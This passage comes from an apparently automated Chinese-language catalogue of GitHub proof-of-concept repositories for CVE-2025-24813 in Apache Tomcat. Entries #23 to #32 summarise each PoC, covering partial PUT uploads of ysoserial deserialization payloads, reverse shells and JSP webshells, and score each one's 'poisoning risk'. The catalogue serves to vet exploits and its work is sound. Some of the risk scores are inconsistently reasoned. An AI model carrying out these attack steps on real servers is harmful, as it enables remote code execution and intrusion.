**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
